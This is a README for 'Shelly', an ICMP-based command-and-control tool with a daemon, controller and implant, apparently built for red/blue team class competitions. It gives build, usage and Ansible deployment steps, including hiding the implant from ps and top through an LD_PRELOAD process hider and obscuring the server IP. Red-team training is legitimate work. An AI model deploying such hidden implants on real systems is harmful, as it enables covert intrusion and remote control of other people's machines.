# Shelly
## An ICMP based C2 server

Shelly is an ICMP based C2 server that I wrote as a red team tool for my Cyber Defense Techniques class. This tool is intended for educational purposes only, and it's goal is to be used in red/blue team competitions.

Shelly is made up of three parts: A daemon, a controller, and an implant.

The project is named after the rift herald from League of Legends (coloquially called shelly).

![shelly](https://media.tenor.com/0Wx4sAm11vcAAAAd/rift-herald-dance.gif)

### Daemon

The daemon is responsible for receiving join requests from the implant and storing those connections in a small database located in /var/lib/shelly/db.json. Once per minute, the daemon sends out heartbeat requests to check if the implants are still connected. If not, it disconnects them. This daemon gives a nice connection list to the controller.

### Controller

The controller is the mechanism by which the operator can communicate with the targets. This interaction comes in the form of a few commands:

- ls: List connected targets and modules
- rm: Remove a target or all targets
- interact: Interact with a specified target using the ICMP shell
- run: Runs an included module against a specified target or all targets
- broadcast: Broadcasts a message to all users on a target
- connect: Sends a connect command to all targets via the broadcast IP

### Implant

The implant is what actually sits on the target device and listens for commands from the daemon and controller. It's able to parse commands and execute them, then return the response to the controller, as well as listen for join and heartbeat commands to communicate with the daemon.

Auto built releases of the implant can be found under 'Releases' on github.

---

## Requirements and Building

It's reccomended to use pyinstaller to build the implant before deploying it on the target system. This can be done with pyinstaller.

First, install the required dependencies

`pip3 install -r requirements.txt`

Then run pyinstaller. This sould be run on the target OS that you intend to deploy it on.

`sudo pyinstaller -y --onefile ./src/implant.py`

Voila! Now, in dist/ you should have an implant executable.

---

## Simple Usage

In order to use shelly, you first need to deploy the daemon and implants.
Once on the target systems, the implants can be run with `sudo ./implant {ip hex}`
The IP hex is just used to make stuff a bit more confusing for the blue team. In order to generate the ip hex, run an IP through cyberchef
https://gchq.github.io/CyberChef/#recipe=Change_IP_format('Dotted%20Decimal','Hex')&input=MTAuMC4xLjI0Mg

From the C2 server, run the daemon with `sudo python3 shellyd.py`

Finally, the controller can be run.


```
     _          _ _
    | |        | | |
 ___| |__   ___| | |_   _
/ __| '_ \ / _ \ | | | | |
\__ \ | | |  __/ | | |_| |
|___/_| |_|\___|_|_|\__, |
                     __/ |
                    |___/
An ICMP based C2 server and agent

Usage: shelly.py command [-h|--help] [-t|--target] [-m|--module]
                 [-M|--message] [-v|--verbose]

Commands:
  ls            List connected targets
  rm            Remove a target
  interact      Interact with a specified target using the ICMP shell
  run           Runs an included module against a specified target or all targets
  broadcast     Broadcasts a message to all users on a target
  connect       Sends a connect command to all targets

Options:
  -h/--help     show this help message and exit
  -t/--target   The target to interact with/run modules on. Specifying 'all' will select ALL targets.
  -m/--module   The module to use for the run command
  -M/--message  The message to be sent with broadcast. Contain the string with quotation marks
  -v/--verbose  Verbosity argument
```

`sudo python3 shelly.py`

Note: All scripts must be run with sudo as it is required by scapy.


## Advanced Deployment

Shelly implants are set to automatically build with pyinstaller via Github actions in order to build standalone executables for competition deployment. These implants can then be sent to multiple targets using the ansible deploy script located in `./deploy/implant`. This ansible script not only deploys the implant to the targets, but also uses an ldpreload to mask the executable from commands like ps and top. This feature is taken from Gianluca Borello's ![libprocesshider](https://github.com/gianlucaborello/libprocesshider).

To run the ansible, add hosts to the inventory.ini file, and ensure you have and SSH key and password for a sudo user.

Once these prerequisites are satisfied, run the ansible:

```bash
ansible-playbook -i inventory.ini deploy.yaml -K
```

Once the implants have been deployed, the shelly daemon can be initialized by copying the shelly code to /usr/bin/shelly, and initializing the daemon

```bash

$ sudo cp -r shelly /usr/bin/shelly
$ sudo cp shelly/deploy/server/shellyd.service /etc/systemd/system/shellyd.service

$ sudo systemctl daemon-reload
$ sudo systemctl enable shellyd 
$ sudo systemctl start shellyd
```

With the daemon started, the shelly controller can be used to connect all of the implants.

```bash
$ sudo python3 shelly.py connect

$ sudo python3 shelly.py ls
```
